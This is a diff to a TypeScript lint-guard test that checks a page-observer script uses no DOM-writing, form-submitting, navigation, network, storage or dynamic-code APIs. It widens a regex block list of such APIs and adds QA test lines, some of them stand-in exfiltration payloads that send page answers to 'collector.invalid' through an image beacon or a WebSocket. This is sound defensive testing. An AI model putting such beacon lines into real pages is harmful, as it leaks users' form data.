@@ -2,32 +2,41 @@
 // click, dispatch or submit anything on a page (R51/A42: observation does not
 // authorize AI answer filling or submission).
 //
-// This is a lint guard over known write, submit, network and storage API names in the
-// observer's source. It cannot prove anything about arbitrary JavaScript (aliases,
-// computed property names, eval). The behavioral boundary is the browser tripwire in
-// scripts/entries-check.mjs (`entries.observer_no_write_calls`), which covers the paths
-// that run actually exercises.
+// This is a lint guard over the observer's source: it flags the listed write, submit,
+// navigation, network, storage and dynamic-code APIs and properties in any spelling it
+// covers (member references including optional calls and `.call`, computed-name writes, and
+// every assignment operator). It cannot prove anything about arbitrary JavaScript: aliases
+// (`const c = el; c[k] = v` with a variable key), APIs not listed, or code outside this file.
+// The behavioral boundary is the browser tripwire in scripts/entries-check.mjs
+// (`entries.observer_no_write_calls`), which covers the paths that run actually exercises.
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { readFileSync } from 'node:fs';
 
-const DOM_PROPERTY = '(value|checked|indeterminate|selected|selectedIndex|textContent|innerText|innerHTML|outerHTML|nodeValue|src|href|type|hidden|contentEditable|className)';
+const PROPERTY =
+  '(value|checked|indeterminate|selected|selectedIndex|defaultValue|defaultChecked|defaultSelected|valueAsNumber|valueAsDate|files|' +
+  'textContent|innerText|outerText|innerHTML|outerHTML|nodeValue|data|src|srcdoc|href|action|type|hidden|disabled|readOnly|' +
+  'contentEditable|className|id|dataset\\s*\\.\\s*\\w+|style\\s*\\.\\s*\\w+)';
+/** Any assignment operator, including compound and logical ones. */
+const ASSIGN = '\\s*(\\*\\*|<<|>>>?|\\|\\||&&|\\?\\?|[-+*/%&|^])?=(?!=)';
+/** Methods that change the page, move focus, submit, navigate or send; any member reference counts. */
+const METHODS =
+  'click|dispatchEvent|focus|blur|select|submit|requestSubmit|reset|showPicker|stepUp|stepDown|setRangeText|setSelectionRange|execCommand|' +
+  'setAttribute|setAttributeNS|setAttributeNode|removeAttribute|removeAttributeNS|toggleAttribute|' +
+  'append|prepend|appendChild|insertBefore|replaceChild|removeChild|replaceWith|replaceChildren|before|after|remove|' +
+  'insertAdjacentHTML|insertAdjacentElement|insertAdjacentText|write|writeln|' +
+  'getContext|toDataURL|toBlob|transferControlToOffscreen|' +
+  'open|send|sendBeacon|postMessage|pushState|replaceState|assign|reload|setItem|removeItem';
 
 const FORBIDDEN: Array<[RegExp, string]> = [
-  [new RegExp(`\\.${DOM_PROPERTY}\\s*(\\+|-|\\|\\||&&|\\?\\?)?=(?!=)`), 'assigns a DOM property'],
-  [/Object\.(assign|defineProperty|defineProperties)\s*\(/, 'assigns properties indirectly'],
-  [/Reflect\.(set|apply|construct|defineProperty)\s*\(/, 'assigns or calls reflectively'],
-  [/\.(set|remove|toggle)Attribute(NS)?\s*\(/, 'changes attributes'],
-  [/\.(append|prepend|appendChild|insertBefore|replaceChild|removeChild|replaceWith|replaceChildren|insertAdjacent\w*|remove)\s*\(/, 'changes the tree'],
-  [/dispatchEvent\s*\(/, 'dispatches events'],
-  [/\.click\s*(\(|\.(call|apply|bind)\b)|\[\s*['"`]click['"`]\s*\]/, 'clicks (including prototype.click.call)'],
-  [/\.(focus|blur|select)\s*\(/, 'moves focus or selection'],
-  [/submit|\.reset\s*\(/i, 'submits or resets (any case, e.g. requestSubmit)'],
-  [/setRangeText|execCommand|setSelectionRange/, 'edits text'],
-  [/getContext|toDataURL|toBlob/, 'creates or reads a canvas context'],
-  [/\bfetch\s*\(|XMLHttpRequest|sendBeacon|WebSocket|EventSource|new\s+Image\b|\.open\s*\(/, 'network'],
-  [/document\.cookie|localStorage|sessionStorage|indexedDB|caches\b/, 'credentials/storage'],
-  [/\beval\s*\(|new\s+Function\b/, 'dynamic code'],
+  [new RegExp(`\\.\\s*${PROPERTY}${ASSIGN}`), 'assigns a DOM property'],
+  [new RegExp(`\\[\\s*['"\`]${PROPERTY}['"\`]\\s*\\]${ASSIGN}`), 'assigns a DOM property by computed name'],
+  [/\b(Object|Reflect)\s*\.\s*(assign|set|apply|construct|defineProperty|defineProperties|setPrototypeOf)\b/, 'assigns or calls indirectly'],
+  [new RegExp(`\\.\\s*(${METHODS})\\b`), 'uses a page-changing, submitting, navigating or sending method'],
+  [/\b(fetch|XMLHttpRequest|WebSocket|EventSource|Image|Audio|Worker|SharedWorker)\b|\bimport\s*\(/, 'network or loading'],
+  [/\blocation\s*(\.\s*\w+\s*)?=(?!=)|\bhistory\s*\./, 'navigation'],
+  [/\bdocument\s*\.\s*cookie|\bcookieStore\b|\blocalStorage\b|\bsessionStorage\b|\bindexedDB\b|\bcaches\b/, 'credentials/storage'],
+  [/\beval\b|\bFunction\s*\(|\bnew\s+Function\b|\bsetTimeout\s*\(\s*['"`]/, 'dynamic code'],
 ];
 
 const observerSource = (): string =>
@@ -40,28 +49,54 @@ function violations(src: string): string[] {
   return FORBIDDEN.filter(([pattern]) => pattern.test(src)).map(([, what]) => what);
 }
 
-test('entry observer source uses no known write, input, submit, network, storage or canvas API (lint guard)', () => {
+test('entry observer source uses none of the listed write, input, submit, navigation, network or storage APIs (lint guard)', () => {
   const src = observerSource();
   assert.deepEqual(violations(src), []);
   // Password, hidden and file inputs are never read.
   assert.match(src, /'password'/);
 });
 
-test('the lint guard flags every insertion QA reported as surviving (EO-2)', () => {
+test('the lint guard flags QA\'s EO-2 insertions verbatim, and the further spellings found in review', () => {
   const src = observerSource();
-  const inserted = [
-    "form.requestSubmit();",
-    "HTMLElement.prototype.click.call(el);",
-    "Object.assign(el, { value: '1' });",
-    "el.value += 'x';",
-    "el.setAttribute('checked', '');",
-    "new WebSocket('wss://example.invalid');",
-    "new Image().src = 'https://example.invalid/b';",
-    "indexedDB.open('x');",
-    "el.checked ||= true;",
-    "el.focus();",
-    "canvas.getContext('2d');",
-    "document.body.append(node);",
+  // QA e26523e, tests/e2e/web/p0_12_w1_review/entries-observer/mutate.mjs, all 12 lines as inserted there.
+  const qa = [
+    '(el as HTMLInputElement).form?.requestSubmit();',
+    'HTMLElement.prototype.click.call(choice);',
+    "Object.assign(el, { value: '42' });",
+    "(el as HTMLInputElement)['value'] = '42';",
+    "(el as HTMLInputElement).value += '0';",
+    "choice.setAttribute('checked', '');",
+    "Reflect.set(choice, 'checked', !choice.checked);",
+    'choice.checked ||= true;',
+    "new win.Image().src = 'https://collector.invalid/?a=' + encodeURIComponent(after);",
+    "new WebSocket('wss://collector.invalid').onopen = null;",
+    "win.indexedDB.open('lc-answers');",
+    '(el as HTMLInputElement).blur?.();',
   ];
-  for (const line of inserted) assert.notDeepEqual(violations(`${src}\n${line}\n`), [], line);
+  // Internal review of 7ee1217: optional calls, spacing, other operators and further APIs.
+  const review = [
+    'el.click?.();',
+    "el.dispatchEvent?.(new Event('change', { bubbles: true }));",
+    'el.focus?.();',
+    "el.setAttribute?.('checked', '');",
+    'document.body.append?.(node);',
+    'fetch?.(url);',
+    'el. click();',
+    'el.checked ^= true;',
+    'el.defaultChecked = true;',
+    "el.defaultValue = 'x';",
+    'el.valueAsNumber = 5;',
+    'el.stepUp();',
+    'el.after(node);',
+    "document.write('<b>x</b>');",
+    "el.dataset.answer = 'b';",
+    'location.assign(url);',
+    'new Audio(url);',
+    'import(url);',
+    "Function('return 1')();",
+    "cookieStore.set('a', 'b');",
+    'canvas.transferControlToOffscreen();',
+    "history.pushState({}, '', '/x');",
+  ];
+  for (const line of [...qa, ...review]) assert.notDeepEqual(violations(`${src}\n${line}\n`), [], line);
 });
